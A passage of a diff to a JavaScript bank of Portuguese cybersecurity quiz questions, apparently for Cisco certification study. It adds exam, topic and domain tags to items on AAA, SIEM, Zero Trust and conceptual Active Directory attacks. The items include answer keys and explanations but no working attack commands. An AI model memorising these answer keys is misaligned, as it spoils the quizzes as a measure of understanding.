@@ -16803,7 +16803,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "A tríade CIA é Confidentiality, Integrity e Availability. Confidencialidade protege o acesso à informação (quem pode ver); Integridade protege contra alterações não autorizadas; Disponibilidade assegura acesso quando necessário.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
       },
       {
         "question": "Um email pede-lhe urgentemente para clicar num link e «validar a conta Cisco» introduzindo a password. Que tipo de ataque de engenharia social é este?",
@@ -16815,7 +16818,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Phishing usa mensagens fraudulentas para induzir a vítima a revelar credenciais ou instalar malware. Spear phishing é a variante altamente personalizada. Não é força bruta, MITM físico nem DDoS.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Qual é a diferença principal entre um firewall de filtragem de pacotes e um sistema IDS/IPS?",
@@ -16827,7 +16833,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Firewalls controlam o que passa segundo regras. IDS (Intrusion Detection) monitoriza e alerta; IPS (Intrusion Prevention) atua em linha e pode descartar tráfego malicioso. São complementares, não substitutos de AAA.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "firewall-vpn",
+        "domain": "2.5"
       },
       {
         "question": "No modelo AAA usado em redes Cisco, o que significam Authentication, Authorization e Accounting?",
@@ -16839,7 +16848,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "AAA: Authentication verifica identidade; Authorization define permissões/políticas; Accounting regista sessões e uso (útil para auditoria e faturação). Protocolos comuns: RADIUS e TACACS+.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
       },
       {
         "question": "Em VPNs, qual afirmação descreve melhor IPsec em comparação com SSL/TLS VPN (ex.: acesso remoto via browser ou AnyConnect em modo SSL)?",
@@ -16851,7 +16863,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "IPsec (AH/ESP, IKE) protege tráfego IP e é clássico em VPNs site-to-site. SSL/TLS VPNs encapsulam sessões de utilizador e são comuns em remote access. Ambos podem coexistir conforme o caso de uso.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "1.6"
       },
       {
         "question": "Qual descrição corresponde corretamente a ransomware?",
@@ -16863,7 +16878,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Ransomware encripta dados e pede resgate. Outros tipos: vírus, worms, trojans, spyware, rootkits. Mitigações: backups offline, patching, MFA, filtragem de email e least privilege.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "O que é Zero Trust, em termos de princípios de segurança de rede?",
@@ -16875,7 +16893,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Zero Trust assume que a rede interna não é zona de confiança automática. Exige autenticação forte, autorização contextual, microsegmentação e verificação contínua (nunca trust, always verify).",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "1.8"
       },
       {
         "question": "No ecossistema Cisco de segurança, qual o papel típico do Cisco ISE (Identity Services Engine) face a uma plataforma de XDR/visão unificada como SecureX (ou sucessoras)?",
@@ -16887,7 +16908,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Cisco ISE é o cérebro de AAA/policy NAC (802.1X, profiling, posture, guest). SecureX (e evoluções) integra alertas e workflows entre firewall, endpoint, email, etc. São complementares na arquitetura de segurança Cisco.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "Qual é a diferença fundamental entre hashing e encriptação simétrica?",
@@ -16899,7 +16923,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Hashes (SHA-256, etc.) não se «desfazem» para recuperar o original — servem para integridade e verificação. Encriptação simétrica (AES) cifra e decifra com a mesma chave. Assimétrico usa pares de chaves pública/privada.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
       },
       {
         "question": "Porque é que a autenticação multifator (MFA) reduz significativamente o risco de compromisso de contas?",
@@ -16911,7 +16938,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "MFA combina fatores (conhecimento, posse, inerência). Mesmo com password vazada, o atacante precisa do segundo fator. É controlo essencial em Zero Trust e em acesso administrativo Cisco (e não substitui patching nem firewalls).",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
       },
       {
         "question": "O que é defense in depth (defesa em profundidade) num ambiente de rede?",
@@ -16923,7 +16953,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Defense in depth sobrepõe controlos complementares: firewalls, segmentação, AAA/MFA, EDR, encriptação, monitorização. Reduz o impacto de uma única falha.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
       },
       {
         "question": "Qual o benefício principal da segmentação de rede (ex.: VLANs, firewalls entre zonas) para a cibersegurança?",
@@ -16935,7 +16968,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Segmentação (e microsegmentação) restringe east-west traffic. Isola IoT/guest da gestão e de data centers, alinhado com Zero Trust e least privilege.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.2"
       },
       {
         "question": "Qual é o objetivo principal de uma plataforma SIEM (Security Information and Event Management)?",
@@ -16947,7 +16983,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Um SIEM agrega logs e eventos de segurança (firewalls, endpoints, identidade, cloud, etc.), normaliza e correlaciona-os, e ajuda analistas a detetar, alertar e investigar incidentes. Não substitui AV por um packet broker, não funciona como CA pública de TLS, e não promete zero falsos positivos ao bloquear DNS às cegas.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.1"
       },
       {
         "question": "Em cibersegurança, para que se usa principalmente o framework MITRE ATT&CK?",
@@ -16959,7 +16998,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O MITRE ATT&CK cataloga táticas (o «porquê») e técnicas (o «como») de adversários no mundo real, muitas vezes com exemplos de procedimentos. Os defensores usam-no para analisar falhas de cobertura, escrever deteções e discutir incidentes de forma consistente. Não é documentação CLI do ASA, não é uma cifra que substitui o AES, e não é uma norma de cablagem.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
       },
       {
         "question": "Contra o que é que um Web Application Firewall (WAF) protege principalmente?",
@@ -16971,7 +17013,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Um WAF fica à frente de aplicações web e inspeciona tráfego HTTP/S para bloquear ou desafiar ataques comuns à camada de aplicação, como SQL injection, cross-site scripting e padrões de pedido conhecidos como maus. Não resolve cortes físicos de cabo, dimensionamento da LSDB OSPF, nem baterias de UPS.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "1.2"
       },
       {
         "question": "Qual é o objetivo principal do DNSSEC?",
@@ -16983,7 +17028,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O DNSSEC acrescenta assinaturas digitais (registos RRSIG e DNSKEY, encadeados com DS no pai) para um resolver validador confirmar que os dados vieram da zona autoritativa e não foram modificados. A confidencialidade da consulta vem de DoT ou DoH, não do DNSSEC. Não substitui a autenticação de email nem a proteção de endpoint.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
       },
       {
         "question": "Em conjunto, o que fazem SPF, DKIM e DMARC na segurança do correio eletrónico?",
@@ -16995,7 +17043,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O SPF autoriza hosts de envio num registo TXT de DNS. O DKIM assina cabeçalhos selecionados e o corpo com uma chave do domínio publicada em DNS. O DMARC exige que o domínio visível do From alinhe com SPF e/ou DKIM e publica uma política (none, quarantine ou reject) mais relatórios. Em conjunto combatem a falsificação do domínio; não encriptam a mensagem nem substituem o TLS do SMTP.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "5.7"
       },
       {
         "question": "Qual é a diferença principal entre EDR e XDR?",
@@ -17007,7 +17058,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "EDR (Endpoint Detection and Response) recolhe telemetria e apoia a resposta nos endpoints. XDR (Extended Detection and Response) alarga a deteção e a resposta a vários pontos de controlo, correlacionando o endpoint com rede, email, cloud e identidade. O Cisco XDR é um exemplo deste modelo mais largo. Nenhum dos dois substitui, por si, o firewall ou a encriptação de disco.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "Para que serve principalmente uma plataforma SOAR?",
@@ -17019,7 +17073,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "SOAR (orquestração, automação e resposta) executa playbooks: enriquecer alertas, abrir casos, isolar hosts, bloquear indicadores e notificar equipas. Complementa o SIEM, que deteta e guarda eventos, em vez de substituir routing ou SPAN.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.2"
       },
       {
         "question": "Numa equipa de operações de segurança, o que é threat hunting?",
@@ -17031,7 +17088,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Threat hunting parte do princípio de que algumas intrusões escapam aos alertas. O hunter formula uma hipótese (por exemplo uma técnica do ATT&CK), consulta dados de endpoint, rede ou identidade, e transforma achados em novas deteções. Complementa SIEM e EDR; não substitui a prevenção nem significa ignorar alertas.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.3"
       },
       {
         "question": "Qual é a principal diferença entre um Indicator of Compromise (IoC) e um Indicator of Attack (IoA)?",
@@ -17043,7 +17103,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Os IoCs são artefactos observáveis ligados a atividade maliciosa conhecida após ou durante o compromisso (hashes de malware, IPs/domínios de C2, nomes de ficheiro). Os IoAs enfatizam comportamentos e técnicas do atacante (ex.: PowerShell invulgar, padrões de credential dumping) para detetar atividade mais cedo e de forma mais resiliente quando a infraestrutura muda. Não são conceitos de crachá/wireless, não substituem CVE/CVSS, e não são sinónimos de linhas de ACL.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.3"
       },
       {
         "question": "Num cenário de compromisso, o que significa normalmente “movimento lateral” (lateral movement)?",
@@ -17055,7 +17118,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O movimento lateral é a fase pós-compromisso em que o adversário salta entre hosts e escala ou reutiliza credenciais (RDP, SMB, Pass-the-Hash, ferramentas de gestão remota, etc.) para alargar a posição e chegar aos “crown jewels”. Não é relocação física de racks, política isolada de rotação de certificados, nem failover de ISP.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Para que serve principalmente um CASB (Cloud Access Security Broker)?",
@@ -17067,7 +17133,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Um Cloud Access Security Broker é um ponto de controlo (baseado em API, proxy reverso/forward, ou ambos) que aplica política de segurança empresarial ao uso de apps cloud: descobrir shadow IT, impor DLP/controlos de acesso e detetar ameaças em contextos SaaS/IaaS. Não substitui o switch de core, não é um motor CVSS alimentado só por NetFlow, e não substitui um PE MPLS.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.3"
       },
       {
         "question": "Em que é que o Business Email Compromise (BEC) difere tipicamente do phishing em massa clássico?",
@@ -17079,7 +17148,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O BEC é tipicamente uma fraude focada: os atacantes impersonam um CEO, responsável financeiro ou fornecedor de confiança e empurram uma transferência ou alteração de dados, muitas vezes sem malware. O phishing clássico lança uma rede larga para roubar passwords ou entregar payloads. O BEC não se define como só zero-day, ransomware de mailboxes, nem limitado a Gmail vs AD.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.7"
       },
       {
         "question": "Qual é o objetivo principal dos controlos de Data Loss Prevention (DLP)?",
@@ -17091,7 +17163,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "As políticas DLP identificam conteúdo sensível e aplicam regras em email, web, endpoints ou apps cloud para dados regulados ou secretos não serem exfiltrados à toa. Complementam — não substituem — firewalls e AV. Não são compressão de backup nem randomização diária de MAC.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "4.4"
       },
       {
         "question": "Em que é que o Network Detection and Response (NDR) se foca principalmente?",
@@ -17103,7 +17178,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Ferramentas NDR observam o comportamento da rede — flows, sessões, por vezes pacotes — para detetar C2, movimento lateral e anomalias, e ajudar os analistas a responder. É mais amplo do que scans mensais de patches, só higiene de tickets ITSM, ou encriptação DNS (DoH/DoT), que são controlos diferentes.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.1"
       },
       {
         "question": "O que procura principalmente o UEBA (User and Entity Behavior Analytics)?",
@@ -17115,7 +17193,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O UEBA constrói linhas de base comportamentais de utilizadores e entidades (hosts, contas de serviço) e assinala atividade anómala que pode indicar takeover de conta, ameaça interna ou movimento lateral. Não é um feed de pontuação CVE, nem desculpa para abrir firewalls a any-any, nem descartar contexto de identidade nos logs.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.11"
       },
       {
         "question": "O que é “shadow IT” no contexto de segurança empresarial?",
@@ -17127,7 +17208,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Shadow IT é o uso de aplicações, SaaS ou infraestrutura sem aprovação de TI/segurança—criando falhas de visibilidade, conformidade e fuga de dados. Não é o CMDB oficial, nem um exercício de crachás na receção, nem uma fibra escura de manutenção.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "3.3"
       },
       {
         "question": "O que procura alcançar um ataque de MFA fatigue (MFA bombing)?",
@@ -17139,7 +17223,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "MFA fatigue/bombing sobrecarrega o utilizador legítimo com prompts de autenticação até aceitar um, entregando ao atacante uma sessão autenticada após roubo de credenciais ou password spray. Não é o mecanismo de SSID guest aberto, downgrade TLS só com ICMP, nem limpar communities BGP.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
       },
       {
         "question": "O que significa um container escape básico num host com workloads Docker/Kubernetes?",
@@ -17151,7 +17238,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Um container escape ocorre quando código dentro do contentor quebra o isolamento (namespaces/cgroups/capabilities/má config) e alcança o SO do host ou workloads irmãos. Não é uma renovação DHCP inofensiva, nem a afirmação de que cada Pod vira VM Type-1, nem só renomear a bridge Docker.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.7"
       },
       {
         "question": "Que problema procura reduzir principalmente o certificate pinning (public-key pinning) numa app móvel ou cliente thick?",
@@ -17163,7 +17253,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Certificate pinning (ou public-key pinning) ensina o cliente a esperar um certificado ou chave específicos (ou um conjunto pequeno), para um proxy TLS com outro certificado assinado por outra CA ter mais probabilidade de falhar. Não põe portas em err-disabled, não substitui DNS por hosts, nem embute passwords no CN.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "cripto",
+        "domain": "2.10"
       },
       {
         "question": "O que a microsegmentação pretende controlar sobretudo no tráfego east-west dentro de um data center ou VPC cloud?",
@@ -17175,7 +17268,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "A microsegmentação aplica controlos por identidade ou label entre workloads para uma brecha num tier não alcançar livremente outros (east-west). Complementa o perímetro; não o substitui por uma VLAN plana, nem desliga cifra para taps, nem usa caminhos dial-up/token-ring obsoletos.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.4"
       },
       {
         "question": "Em que se baseia principalmente uma técnica living-off-the-land (LOLBins) durante uma intrusão?",
@@ -17187,7 +17283,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Living-off-the-land abusa de binários e scripts legítimos pré-instalados para as ações maliciosas se misturarem com atividade de admin e escaparem a AV só por hash. Não se define por drivers USB sozinhos, partidas DNS/NTP, nem por um SNMP write mágico que abre a Internet toda.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.9"
       },
       {
         "question": "Num compromisso da cadeia de fornecimento de software (estilo SolarWinds), que relação de confiança o atacante abusa sobretudo?",
@@ -17199,7 +17298,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Ataques à supply-chain miram a confiança nas atualizações do fornecedor ou artefactos CI/CD — o malware é injetado a montante e entregue como software “legítimo”. Portais Wi-Fi guest, Bluetooth da máquina de café e faxes do átrio não são o caminho definidor desta classe de ataque.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Qual é o objetivo principal de segurança ao implantar honeypots ou tecnologia de deception mais ampla?",
@@ -17211,7 +17313,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Honeypots/deception apresentam ativos ou tokens falsos que utilizadores legítimos quase não tocam; a interação é um sinal forte de atividade hostil e pode atrasar ou distrair atacantes. Não abrem firewalls any-any, não guardam passwords em claro nem desativam logging dos DC.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
       },
       {
         "question": "Porque é que os atacantes por vezes abusam de DNS tunneling para comando-e-controlo ou exfiltração de dados?",
@@ -17223,7 +17328,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "O DNS tunneling codifica dados em queries/respostas DNS; muitas redes permitem DNS de saída, o que pode contornar controlos que bloqueiam outros protocolos. O DNS não é inerentemente TLS ponta-a-ponta em todas as queries, não substitui BGP/OSPF nem apaga contas AD.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "6.5"
       },
       {
         "question": "No planeamento de disaster recovery, como diferem principalmente o RTO e o RPO?",
@@ -17235,7 +17343,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O Recovery Time Objective (RTO) limita quanto tempo um serviço pode ficar em baixo; o Recovery Point Objective (RPO) limita quantos dados se pode perder, expresso em tempo antes do incidente. Não são marcas de fitas, temporizadores OSPF nem métricas de phishing/limpeza de firewall.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.4"
       },
       {
         "question": "Num ambiente Windows Active Directory, o que reutiliza principalmente um ataque pass-the-hash (PtH)?",
@@ -17247,7 +17358,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O pass-the-hash reutiliza hashes NTLM (ou relacionados) capturados para autenticar sem obter a password em claro. Não se limita a uma password digitada, nem é uma técnica de BGP ou de DHCP rogue.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Qual é o objetivo principal de segurança ao plantar canary tokens (ou honeytokens semelhantes) em ficheiros, URLs ou credenciais?",
@@ -17259,7 +17373,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Canary tokens / honeytokens são artefactos isco que não devem ser usados no trabalho normal; o acesso gera um sinal forte de probing ou roubo. Não substituem o SIEM, não cifram discos por si nem desativam MFA.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "2.3"
       },
       {
         "question": "Em que se baseia principalmente um sistema air-gapped para se isolar de ameaças remotas via rede?",
@@ -17271,7 +17388,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "O air-gap isola um sistema mantendo-o fora de redes não confiáveis (fisicamente ou com controlos extremos), reduzindo malware remoto e caminhos de C2. Exposição aberta em cloud, IPsec permanente à Internet ou juntar-se ao Wi-Fi corporativo desativando defesas contradiz esse isolamento.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
       },
       {
         "question": "Em que diferem principalmente as funções de red team, blue team e purple team num exercício de segurança?",
@@ -17283,7 +17403,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "As red teams emulam adversários (ofensiva). As blue teams protegem, detetam e respondem (defesa). O purple teaming liga as duas para técnicas de ataque e deteções melhorarem em conjunto. As outras opções invertem ou inventam funções e tratam as labels como o mesmo escalão de SOC.",
-        "difficulty": "Fácil"
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
       },
       {
         "question": "Qual é a diferença principal entre consumir feeds de threat intelligence e fazer threat hunting?",
@@ -17295,7 +17418,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Os feeds de threat intelligence fornecem IOCs/TTPs/contexto que ferramentas e analistas podem usar. O threat hunting é uma procura proativa na telemetria por atividade suspeita que os alertas podem ter falhado. O hunting usa muitas vezes intel, mas não é o mesmo que ingerir feeds passivamente; nenhuma das atividades se limita a listas de patches, impressoras ou checks de RH.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.3"
       },
       {
         "question": "O que tenta obter principalmente um ataque Kerberoasting num ambiente Active Directory?",
@@ -17307,7 +17433,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O Kerberoasting pede tickets de serviço Kerberos (TGS) para contas com SPN, extrai o material cifrado e faz crack offline para recuperar passwords de contas de serviço—muitas vezes com privilégios elevados. Não é sobre spoofing de helper DHCP para PSK VPN, certificados MDM via WPA3 SAE, nem esvaziar keychains TCP-AO de BGP para obter SSH root.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "O que tenta abusar principalmente um ataque de NTLM relay num ambiente Windows?",
@@ -17319,7 +17448,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O NTLM relay intercepta uma autenticação NTLM legítima e reutiliza-a contra outro alvo (muitas vezes quando signing ou channel binding estão fracos). Não é AS-REP roasting, nem flooding EAP-TLS no RADIUS, nem um ajuste local de desempenho SMB.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.5"
       },
       {
         "question": "Em que é que o password spraying difere principalmente de um brute-force online clássico contra uma só conta?",
@@ -17331,7 +17463,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O password spraying espalha poucas passwords prováveis por muitos utilizadores para ficar abaixo dos limiares de lockout; o brute-force online clássico concentra muitas tentativas numa conta. Não se limita a chaves SSH, não precisa de consola no DC e não é Kerberoasting.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Em ataques a Active Directory, o que permite principalmente um DCSync bem-sucedido a um adversário?",
@@ -17343,7 +17478,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "O DCSync abusa de privilégios de replicação do diretório (muitas vezes após roubar credenciais de alto privilégio) para pedir segredos/hashes como se o atacante fosse um DC. Não é trocar MSI de GPO, desligar Kerberos na forest, nem reescrever SPNs em CNAMEs DNS públicos.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Na análise de malware, o que significa principalmente “sandbox detonation”?",
@@ -17355,7 +17493,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Sandbox detonation executa uma amostra suspeita num ambiente isolado e controlado para capturar indicadores comportamentais com segurança. Não é apagar DCs, desativar EDR para tocar no schema AD, nem publicar amostras em paste sites públicos como definição.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.6"
       },
       {
         "question": "Em ataques a Active Directory, em que é que um Golden Ticket difere principalmente de um Silver Ticket?",
@@ -17367,7 +17508,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Golden Tickets forjam TGTs com o hash KRBTGT (acesso amplo para pedir service tickets). Silver Tickets forjam um TGS para um serviço com o hash dessa conta. São construções Kerberos, não regras JWT só Linux/Azure, e o Silver não exige exclusivamente DCSync primeiro.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Na deteção de rede, como se manifesta tipicamente o “beaconing” de malware para um servidor C2 (command-and-control)?",
@@ -17379,7 +17523,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Beaconing são check-ins repetidos do malware ao C2 (HTTP/DNS/etc.), muitas vezes periódicos e discretos. Não é um burst UDP único no DHCP, rewrite OSPF em mesh, nem só email sem callbacks outbound.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.7"
       },
       {
         "question": "O que é que o AS-REP roasting abusa principalmente em ambientes Kerberos de Active Directory?",
@@ -17391,7 +17538,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O AS-REP roasting mira contas com pré-autenticação Kerberos desativada: o atacante obtém o ciphertext AS-REP e faz crack offline da password. Não é flood RADIUS/EAP-TLS, rewrite de communities BGP, nem starvation DHCP.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Em ataques baseados em Kerberos, o que envolve principalmente o Pass-the-Ticket (PtT)?",
@@ -17403,7 +17553,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Pass-the-Ticket reutiliza um ticket Kerberos roubado (muitas vezes de LSASS/cache de tickets) para autenticar sem a password em claro. Distingue-se do crack de hashes NTLM via spoofing LLMNR, phishing de fadiga MFA, ou crack WPA3 SAE.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Porque é que os atacantes fazem muitas vezes dump de credenciais do processo LSASS num host Windows?",
@@ -17415,7 +17568,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O LSASS (Local Security Authority Subsystem Service) faz cache de segredos de logon como hashes NTLM e tickets Kerberos; o dump alimenta PtH/PtT e movimento lateral. Não é repositório de filas de impressão, nem o único cofre GPO de PSK Wi-Fi para Azure, nem um ritual de desbloqueio BIOS/BitLocker TPM.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.2"
       },
       {
         "question": "O que caracteriza malware fileless em ataques a endpoints?",
@@ -17427,7 +17583,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Malware fileless privilegia execução em memória ou living-off-the-land (PowerShell/WMI/etc.), pelo que scans clássicos em disco falham mais. Não se limita a impressoras air-gapped, não é só worm USB de .exe, nem é sinónimo de ransomware só de encriptação de disco.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "2.8"
       },
       {
